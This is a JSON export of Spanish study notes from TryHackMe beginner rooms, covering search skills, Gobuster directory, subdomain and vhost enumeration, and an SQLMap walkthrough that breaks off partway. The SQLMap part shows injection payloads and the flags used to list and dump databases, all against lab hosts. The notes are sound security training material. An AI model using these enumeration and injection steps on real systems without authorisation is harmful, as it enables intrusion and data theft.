    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/0. Search Skills.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/1. Introduction|1. Introduction]]\n[[2. Evaluation of Search Results]]\n[[3. Search Engines]]\n[[4. Specialized Search Engines]]\n[[5. Vulnerabilities and Exploits]]\n[[6. Technical Documentation]]\n[[7. Social Media]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Una búsqueda en Google \"learn cyber security\" obtiene unos 600 millones de resultados. La búsqueda \"learn hacking\" más del doble.\n\nEstamos rodeados de información. Pero ¿qué prefieres? ¿Aceptar los primeros pocos resultados que aparezcan o adquirir las habilidades necesarias para encontrar lo que buscas?"
  },
  {
    "title": "6. Technical Documentation",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/6-technical-documentation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/6. Technical Documentation.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Una habilidad fundamental es ser capaz de buscar en la documentación oficial.\n\n<h2>Páginas de Manual de Linux</h2>\nAntes de que Internet funcionara en todos sitios, ¿cómo podías conseguir ayuda en un sistema UNIX? La respuesta es mirando el manual: `man`. En todos los sistemas UNIX, se espera de cada comando que este tenga una página de manual.\n\nPara ver el manual del comando `ip`, podemos escribir `man ip`. Para salir de la página de manual, presionamos `q`.\n\nSe pueden mirar páginas de manual en cualquier buscador.\n\n------------\n<h2>Microsoft Windows</h2>\nMicrosoft ofrece una [página](https://learn.microsoft.com/en-us/) de documentación técnica para sus productos.\n\n-------------\n<h2>Documentación de Producto</h2>\nDe todos los productos populares se espera que tengan una documentación bien organizada. Esta ofrece una fuente de información oficial y confiable. Algunos ejemplos son [Snort Official Documentation](https://www.snort.org/documents), [Apache HTTP Server Documentation](https://httpd.apache.org/docs/), [PHP Documentation](https://www.php.net/manual/en/index.php)y [Node.js Documentation](https://nodejs.org/docs/latest/api/)\n"
  },
  {
    "title": "2. Evaluation of Search Results",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/2-evaluation-of-search-results/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/2. Evaluation of Search Results.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "En Internet todo el mundo puede publicar sus escritos. Puede ser en forma de blogs, artículos o publicaciones en redes sociales. \n\nEs nuestro trabajo como lectores evaluar la información. Algunas cosas que tener en cuenta al evaluarla:\n\n- Fuente: Identifica al autor u organización publicadora de dicha información y considera su reputación y autoridad en la materia.\n- Evidencia y razonamiento: Comprueba que lo dicho esté respaldado por evidencia creíble y razonamiento lógico.\n- Objetividad y tendencia: Evalúa si la información está presentada de manera imparcial, reflejando múltiples perspectivas. O si por el contrario tiene una inclinación de algún tipo.\n- Corroboración y consistencia: Valida la información presentada contrastando con más fuentes fiables independientes. Comprueba que varias fuentes con reputación y confiables coinciden."
  },
  {
    "title": "7. Social Media",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/3-search-skills/7-social-media/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/3. Search Skills/7. Social Media.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey > 3. Search Skills",
    "content": "Hay millones de usuarios registrados en plataformas de redes sociales como Facebook, Twitter o LinkedIn.\n\nDe manera ideal, querríamos poder explorar estas plataformas sin crear una cuenta pero esto limita severamente la experiencia. Para evitar esto podemos usar correos temporales para que no se conecten con nuestro correo verdadero. Una vez explorado, cerramos la cuenta y el email.\n\nEl poder de las redes sociales es que te permite conectar con personas y empresas que te interesen. Además están llenas de información valiosa para los especialistas en ciberseguridad, ya sea para aprender o para buscar personas."
  },
  {
    "title": "6. Use Case - Vhost Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/6-use-case-vhost-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/6. Use Case - Vhost Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "El último modo que estudiaremos será el modo `vhost`. Este nos permite bruteforcear hosts virtuales. Los hosts virtuales son diferentes páginas web en una misma máquina. A veces, pueden parecer subdominios, pero no es lo mismo. Los hosts virtuales se basan en la IP y corren en el mismo servidor, mientras que los subdominios se configuran en la DNS. La diferencia princcipal es la forma en la que Gobuster investiga estos tipos:\n\n- `vhost`: Navega a la URL creada combinando el hostname configurado (`-u`) y una entrada del diccionario.\n- `dns`: Hará un lookup DNS al FQDN creado combinando el dominio configurado (`-d`) con una entrada del diccionario.\n\n----------------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa sobre lo que te puede ofrecer el comando `vhost` con Gobuster, puedes ver la página  de help. Como verla entera puede ser intimidante, vamos a centrarnos en las siguientes funcionalidades:\n\n| Flag corta | Flag larga          | **Descripción**                                                                            |\n| ---------- | ------------------- | ------------------------------------------------------------------------------------------ |\n| `-u`       | `--url`             | Especifica la URL base (dominio objetivo) para bruteforcear nombres de hosts virtuales.    |\n|            | `--append-domain`   | Añade el dominio base a cada entrada del diccionario.                                      |\n| `-m`       | `--method`          | Especifica el método HTTP a usar para las peticiones                                       |\n|            | `--domain`          | Añade un dominio a cada entrada del diccionario (útil si no se ofrece de manera explícita) |\n|            | `--exclude-length`  | Excluye resultados basados en la longitud de la respuesta                                  |\n| `-r`       | `--follow-redirect` | Sigue redirecciones HTTP                                                                   |\n\n-----------------------------\n<h2>¿Cómo usar el modo vhost?</h2>\nPara usar Gobuster con el modo `vhost`, podemos usar la siguiente sintaxis:\n\n`gobuster vhost -u \"http://example.thm\" -w /papth/to/wordlist`\n\nDate cuenta de que las flags `-u` y `-w` son necesarias para la correcta ejecución de la herramienta. Veamos un ejemplo de ejecución:\n\n   ```shell\n   root@tryhackme:~# gobuster vhost -u \"http://10.10.151.214\" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320  \n=============================================================== \nGobuster v3.6 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== \n[+] Url:              http://10.10.94.214 \n[+] Method:           GET \n[+] Threads:          10 \n[+] Wordlist:         /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \n[+] User Agent:       gobuster/3.6 \n[+] Timeout:          10s \n[+] Append Domain:    true \n[+] Exclude Length:   250,254,263,274,283,293,294,299,253,261,269,277,285,290,300,257,258,270,278,282,291,252,260,264,268,271,279,280,289,251,256,262,265,272,297,287,292,295,255,266,276,284,286,296,267,273,275,281,288,259,298 \n=============================================================== \nStarting gobuster in VHOST enumeration mode \n=============================================================== \nFound: blog.example.thm Status: 200 [Size: 1493] \nFound: shop.example.thm Status: 200 [Size: 2983] \nFound: www.example.thm Status: 200 [Size: 84352] \nFound: chelyabinsk-rnoc-rr02.backbone.example.thm Status: 404 [Size: 304] \nFound: academy.example.thm Status: 200 [Size: 434] \nProgress: 4989 / 4990 (99.98%) \n=============================================================== \nFinished \n===============================================================\n```\n\nNotarás que este comando es mucho más complejo que la sintaxis básica. Contiene muchas flags configuadas. Al no tener configurada una infraestructura DNS, tenemos que añadir más flags, como `--domain` o `--append-domain`. Necesitamos observar las peticiones que Gobuster manda para entender mejor cómo funcionan estas flags. Abajo podemos ver una petición GET básica:\n\n```javascript\nGET / HTTP/1.1\nHost: www.example.thm\nUser-Agent: gobuster/3.6\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/ *;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\n```\n\nGobuster mandará múltiples peticiones cambiando el valor `Host:` cada vez. El valor en esta es `www.example.thm`, podemos desglosarlo en tres partes:\n\n- `www`: Este es el subdominio, es la parte que Gobuster llenará con cada entrada del diccionario.\n- `.example`: El dominio de segundo nivel, puedes configurarlo con la flag `--domain` (debes configurarlo con el dominio de primer nivel).\n- `.thm`: El dominio de primer nivel. Puedes configurarlo con la flag `--domain` (debes configurarlo con el dominio de segundo nivel).\n\nAhora que conocemos cómo manda peticiones Gobuster, examinemos el comando más detenidamente:\n\n- `gobuster vhost`: Le dice a Gobuster que enumere hosts virtuales.\n- `-u \"http://10.10.151.214\"`: Configura la URL.\n- `-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`: Configura el diccionario a utilizar.\n- `--domain example.thm`: Configura el dominio de primer y segundo nivel.\n- `--append-domain`: Añade cada dominio configurado a cada entrada del diccionario. Si no se configura, el hostname será www, blog, etc y puede causar falsos positivos.\n- `--exlude-length`: Filtra las respuestas que recibimos de las peticiones mandadas en base a su longitud. Sirve para evitar los falsos positivos. Como en general sólo nos interesa el código 200 OK, podemos filtrar por rango y decirle `--exclude-length 250-320`.\n\n\n"
  },
  {
    "title": "5. Use Case - Subdomain Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/5-use-case-subdomain-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/5. Use Case - Subdomain Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "El siguiente modo en el que nos enfocaremos será el modo `dns`. Este nos permite bruteforcear subdominios. Durante un pentest, buscar subdominios de tu objetivo es esencial. Porque una vulnerabilidad esté parcheada en el dominio principal, no significa que también lo esté en el subdominio.\n\n----------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa de lo que el comando `dns` puede ofrecernos en Gobuster, puedes mirar la página de help. Como puede ser un poco intimidante, nos centraremos sólo en:\n\n| Flag | Flag larga     | Descripción                                                                |\n| ---- | -------------- | -------------------------------------------------------------------------- |\n| `-c` | `--show-cname` | Muestra los registros CNAME (no puede ser usado con la flag -i)            |\n| `-i` | `--show-ips`   | Muestra las direcciones IPs hacia las que el dominio y subdomino resuelven |\n| `-r` | `--resolver`   | Configura un DNS personalizado que usar para resolver                      |\n| `-d` | `--domain`     | Configura el dominio que queramos enumerar                                 |\n\n----------------------------\n<h2>¿Cómo usar el modo dns?</h2>\nPara usar el modo `dns` se debe usar la siguiente sintaxis:\n\n`gobuster dns -d example.thm -w /path/to/wordlist`\n\nLas flags `-d` y `-w` son necesarias para que el modo de enumeración de subdominios funcione correctamente. Veamos un ejemplo:\n\n`gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`\n\n- `gobuster dns`: Enumera subdominios en el dominio configurado.\n- `-d example.thm`: Configura el dominio.\n- `-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`: Configura el diccionario.\n\nSi probamos el comando deberíamos obtener:\n\n```shell\nroot@tryhackme:~# gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt\n=============================================================== \nGobuster v3.6 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart) \n=============================================================== \n[+] Domain:     example.thm \n[+] Threads:    10 \n[+] Timeout:    1s \n[+] Wordlist:   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \n=============================================================== \nStarting gobuster in DNS enumeration mode \n=============================================================== \nFound: www.example.thm\nFound: shop.example.thmç\nFound: academy.example.thm\nFound: primary.example.thm                                                                                                                                        Progress: 4989 / 4990 (99.98%) \n=============================================================== \nFinished \n===============================================================\n```\n\n"
  },
  {
    "title": "0. Gobuster - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/0-gobuster-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/0. Gobuster - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/1. Introduction]]\n[[2. Environment and Setup]]\n[[3. Gobuster - Introduction]]\n[[4. Use Case - Directory and File Enumeration]]\n[[5. Use Case - Subdomain Enumeration]]\n[[6. Use Case - Vhost Enumeration]]\n\n"
  },
  {
    "title": "4. Use Case - Directory and File Enumeration",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/4-use-case-directory-and-file-enumeration/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/4. Use Case - Directory and File Enumeration.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Gobuster tiene un modo `dir`, que nos permite enumerar los directorios web y sus archivos. Este es útil al realizar pentesting y explorar la estructura de directorios y los archivos que contienen. Normalmente, las estructuras de directorios siguen una convención concreta, haciéndolos susceptibles a ser enumerados. Por ejemplo, la estructura de directorios de un servidor web que contiene WordPress es algo como:\n\n\n```bash\nroot@tryhackme:~# tree -L 3 -d \n. \n└── html\n\t└── wordpress         \n\t├── wp-admin         \n\t├── wp-content         \n\t└── wp-includes\n```\n\nGobuster es una herramienta potente porque te permite escanear una página web y observar los códigos de respuesta.\n\n-----------------------\n<h2>Help</h2>\nSi quieres una vista por encima completa de lo que el modo `dri` puede hacer en Gobuster, puedes mirar la página de ayuda con `gobuster dir --help`:\n\n| Flag | Flag larga                 | Descripción                                                                                                                                                                    |\n| ---- | -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| `-c` | `--cookies`                | Configura una cookie que pasar con cada petición, como una cookie de sesión.                                                                                                   |\n| `-x` | `--extensions`             | Especifica las extensiones que quieres listar (como .php, .js, etc).                                                                                                           |\n| `-H` | `--headers`                | Configura un header completo el cual pasar con cada petición.                                                                                                                  |\n| `-k` | `--no-tls-validation`      | Se salta el proceso que verifica el certificado TLS cuando se usa HTTPS. Pasa con páginas que están autofirmadas, como un CTF o las rooms en tryhackme que puede causar error. |\n| `-n` | `--no-status`              | Configura esta flag si no quieres ver códigos de estado de cada respuesta en pantalla.                                                                                         |\n| `-P` | `password`                 | Puedes usar esta flag junto a la flag `--username` para lanzar peticiones autentificadas. Útil cuando ya has obtenido credenciales.                                            |\n| `-s` | `--status-codes`           | Configura qué respuestas ver dependiendo de su código de estado. De una en una (200) o en rango (300-400).                                                                     |\n| `-b` | `--status-codes-blacklist` | Permite configurar qué respuestas NO quieres ver dependiendo de su código de estado.                                                                                           |\n| `-U` | `--username`               | Puedes usarla junto a `--password` para lo expuesto arriba.                                                                                                                    |\n| `-r` | `--followredirect`         | Configura Gobuster para seguir la redirección que recibió (301 o 302).                                                                                                         |\n\n----------------------\n<h2>Cómo usar el modo dir</h2>\nPara usar Gobuster en modo `dir`, usa el siguiente formato:\n\n`gobuster dir -u <URL> -w <WORDLIST>`\n\nFíjate que el comando también incluye las flags `-u` y `-w`, además del modo `dir`. Estas dos flags son necesarias para que Gobuster funcione en modo enumeración de directorios. Veamos un caso práctico:\n\n`gobuster dir -u \"http://www.example.thm\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r `\n\nEste comando escanea todos los directorios en `www.example.thm` usando el diccionario `directory-list-2.3-medium.txt`.\n\n- `gobuster dir`: Configura Gobuster en modo escaneo de directorios.\n- `-u http://www.example.thm`:\n  - La URL será la base donde Gobuster empezará a mirar. Puedes pensar en esto como `http://www.example.com/path/to/folder`.\n  - Se requiere el protocolo, si pasaas el erroneo, el escaneo fallará, en este caso es `http`.\n  - Si pones la IP en lugar del dominio podrías estar escaneando una web que no es ya que un sólo servidor puede hostear varias páginas web con virtual hosting.\n  - Gobuster no enumera recursivamente, por lo que si ves un directorio que te interese deberás escanearlo tú mismo.\n- `-w /usr/hsare/wordlists/dirbuster/directory-list-2.3-medum.txt`: Configura Gobuster para usar dicho diccionario para enumerar. Cada una de las entradas del documenro es añadida a la URL base.\n- `-r`: Configura Gobuster para seguir las redirecciones.\n\nMiremos otro ejemplo en el que usamos `-x`:\n\n`gobuster dir -u \"http://www.example.thm\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.js`\n\nEs igual que el comando anterior pero hemos quitado `-r` y añadido `-x`. Esta flag configura qué extensiones de directorios/archivos debe listar Gobuster."
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Esta unidad se centra en la herramienta de seguridad ofensiva Gobuster, comúnmente usada para reconocimiento. Exploraremos cómo puede enumerar directorios, subdominios y hosts virtuales.\n\n----------------\n<h2>Objetivos de aprendizaje</h2>\n- Entender lo básico de la enumeración.\n- Cómo usar Gobuster para enumerar los directorios y archivos web.\n- Cómo usar Gobuster para enumerar subdominios.\n- Cómo usar Gobuster para enumerar hosts virtuales.\n- Cómo usar una wordlist.\n\n"
  },
  {
    "title": "2. Environment and Setup",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/2-environment-and-setup/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/2. Environment and Setup.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Para esta unidad, usaremos la máquina virtual Ubuntu 20.04 actuando como servidor. Este servidor hostea múltiples subdominios y hosts virtuales. El servidor también tiene dos sistemas de manejo de contenido (CMS) instalados. Estos son WordPress y Joomla.\n\nPuedes encontrar instrucciones de instalación de Gobuster en su [repositorio oficial](https://github.com/OJ/gobuster). Para poder asegurarnos de que podemos resolver los dominios usados a lo largo de la unidad, debemos cambiar el archivo `/etc/resolv-dnsmasq`:\n\n- Abre una terminal e introduce el comando `sudo vi /etc/resolv-dnsmasq`.\n- Inserta `nameserver <IP_de_la_maquina>` en la primera línea.\n- Guarda el archivo presionando `Esc` y escribiendo `:wq`.\n- Introduce el comando `/etc/init.d/dnsmasq restart`.\n\nEl archivo debería verse así:\n\n```shell-session\nroot@tryhackme:~# cat /etc/resolv-dnsmasq \nnameserver MACHINE_IP\nnameserver 169.254.169.253\n```\n\n"
  },
  {
    "title": "3. Gobuster - Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/2-gobuster-the-basics/3-gobuster-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/2. Gobuster - The Basics/3. Gobuster - Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 2. Gobuster - The Basics",
    "content": "Gobuster es un software de código abierto escrito en Golang. Enumera directorios, subdominios DNS, hosts virtuales, buckets Amazon S3, y Almacenamiento de Google Cloud por fuerza bruta, usando diccionarios específicos y manejando las respuestas entrantes. Muchos profesionales la usan para pruebas de penetración, bug bounty, etc. Mirando las fases del hackeo ético la podemos colocar en la fase de escaneo y reconocimiento.\n\nEstudiaremos algunos conceptos antes de meternos de lleno con Gobuster.\n\n<h4>Enumeración</h4>\nLa enumeración es el acto de escuchar los recursos disponibles, ya sean accesibles o no. Por ejemplo, Gobuster enumera directorios web.\n\n<h4>Fuerza Bruta</h4>\nLa fuerza bruta es el acto de intentar cada combinación posible hasta dar con una coincidencia. Gobuster usa listas de palabras (diccionarios) para este propósito.\n\n---------------------------\n<h2>Gobuster: Vista por Encima</h2>\nGobuster viene incluido por defecto en distros como Kali Linux. Veamos primero la página de ayuda:\n\n```shell\nroot@tryhackme:~# gobuster --help \nUsage:   \n\tgobuster [command]  \nAvailable Commands:   \n\tcompletion  Generate the autocompletion script for the specified shell   \n\tdir         Uses directory/file enumeration mode   \n\tdns         Uses DNS subdomain enumeration mode   \n\tfuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body   \n\tgcs         Uses gcs bucket enumeration mode   \n\thelp        Help about any command   \n\ts3          Uses aws bucket enumeration mode   \n\ttftp        Uses TFTP enumeration mode   \n\tversion     shows the current version   \n\tvhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)  \n\t\nFlags:       \n\t--debug                 Enable debug output       \n\t--delay duration        Time each thread waits between requests (e.g. 1500ms)   \n\t-h, --help                  help for gobuster       \n\t--no-color              Disable color output       \n\t--no-error              Don't display errors   -z, --no-progress           Don't display progress   \n\t-o, --output string         Output file to write results to (defaults to stdout)   \n\t-p, --pattern string        File containing replacement patterns   \n\t-q, --quiet                 Don`t print the banner and other `noise   \n\t-t, --threads int           Number of concurrent threads (default 10)   \n\t-v, --verbose               Verbose output (errors)   \n\t-w, --wordlist string       Path to the wordlist. Set to - to use STDIN.     \n\t\t--wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)  \nUse \"gobuster [command] --help\" for more information about a command.\n```\n\nEsta página contiene múltiples secciones:\n\n- **Usage:** Muestra la sintaxis de cómo usar el comando.\n- **Available Commands:** Hay múltiples comandos disponibles para ayudarnos a enumerar directorios, archivos, subdominios, buckets de almacenamiento en nube y amazon AWS S3. A lo largo de esta unidad veremos `dir`, `dns` y `vhost`.\n- **Flags:** Son opciones específicas que podemos configurar para personalizar nuestros comandos. Veamos las flags que más usaremos a lo largo de la unidad:\n\n| Flag corta | Flag larga   | Descripción                                                                                                                                                                       |\n| ---------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `-t`       | `--threads`  | Configura el número de hilos usados por el escáner.Cada uno de estos manda peticiones con un pequeño retardo. El número por defecto es 10.                                        |\n| `-w`       | `--wordlist` | Configura un diccionario para iterar.                                                                                                                                             |\n|            | `--delay`    | Define la cantidad de tiempo que esperar entre cada petición. Algunos servidores incluyen mecanismos para detectar la enumeración por la cantidad de peticiones en cierto tiempo. |\n|            | `--debug`    | Nos ayuda a diagnosticar errores cuando nuestro comando lanza errores inesperados.                                                                                                |\n| `-o`       | `--output`   | Guarda los resultados de la enumeración en el archivo especificado.                                                                                                               |\n\n-------------------------------\n<h2>Ejemplo</h2>\nMiremos un ejemplo de cómo podríamos usar estos comandos y flags juntos para enumerar directorios web.\n\n`gobuster dir -u \"http://www.example.thm/\" -w /usr/share/wordlists/dirb/small.txt -t 64`\n\n- `gobuster dir`: Le dice a Gobuster que queremos enumerar directorios.\n- `-u \"http://www.example.thm/\"`: Le dice a Gobuster que la URL objetivo es http://www.example.thm/\n- `-w /usr/share/wordlists/dirb/small.txt`: Le dice a Gobuster que use el diccionario `small.txt` situado en el directrio `/usr/share/wordlists/dirb` de nuestra máquina. Usará cada entrada del diccionario para mandar una petición web a esa URL.\n- `-t 64`: Configura el número de hilos a utilizar en 64."
  },
  {
    "title": "3. Automated SQL Injection Tool",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/3-automated-sql-injection-tool/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/3. Automated SQL Injection Tool.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "Ejecutar un ataque SQLI, requiere encontrar la vulnerabilidad SQLI dentro de una aplicación web. Sin embargo, hacer eso de forma manual puede requerir tiempo y esfuerzo.\n\nSQLMap es una herramienta automatizada para detectar y explotar SQLI en aplicaciones web. Simplifica el proceso de identificar estas vulnerabilidades.\n\nEs una herramienta de CLI, por lo que si escribes `--help` podrás ver todas las flags que puedes usar. Si no quieres hacerlo manualmente en cada comando, puedes activar la flag `--wizard` que hará que te guíe por el proceso:\n\n```shell\nuser@ubuntu:~$ sqlmap --wizard\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.2.4#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n\n[*] starting at 08:42:50\n\n[08:42:50] [INFO] starting wizard interface\nPlease enter full target URL (-u): \n```\n\nLa flag `--dbs` te ayuda a extraer los nombres de las bases de datos. Una vez los tengas, puedes extraer información de las tablas de esa base de datos usando `-D database_name --tables`. Después de obtener las tablas, puedes usar `-D database_name -T table_name --dump`. Las diferentes flags nos ayudan a extraer información detallada de las bases de datos. Veamos un caso práctico:\n\nEl primer paso es buscar una URL vulnerable. Muchas veces te encontrarás con URLs que usan peticiones GET (como `http://sqlmaptesting.thm/search?cat=1`) para obtener la información, si ves una de estas puedes testear la URL con la flag `-u`.\n\nUsaremos una URL web supuesta vulnerable: `http://sqlmaptesting.thm` para la demostración. Supón que esta página tiene una opción de búsqueda y cuando haces click en ella y buscas algo, la URL se convierte en `http://sqlmaptesting.thm/cat=1`, que usa el parámetro GET `cat=1`. Como sabemos, estas URLs pueden ser vulnerables, por lo que probamos:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1\n      __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:43:49] [INFO] testing connection to the target URL\n[08:43:49] [INFO] heuristics detected web page charset 'ascii'\n[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS\n[08:43:49] [INFO] testing if the target URL content is stable\n[08:43:50] [INFO] target URL content is stable\n[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic\n[text removed]\n[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable \n[text removed]\n[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y\nsqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))\n\n    Type: AND/OR time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: cat=1 AND SLEEP(5)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq\n---\n[08:45:16] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[text removed]\n```\n\nLos resultados muestran que diferentes tipos de SQLI se han identificado en la URL objetivo. Estas son técnicas de SQLI. Mientras que en una \"boolean based\" usas booleanos, como `1=1`, en una \"error based\" modificas la query para generar errores y estos errores contienen información valiosa sobre los datos.\n\nUsemos flags para explotar la URL:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:49:00] [INFO] resuming back-end DBMS' mysql' \n[08:49:00] [INFO] testing connection to the target URL\n[08:49:01] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]  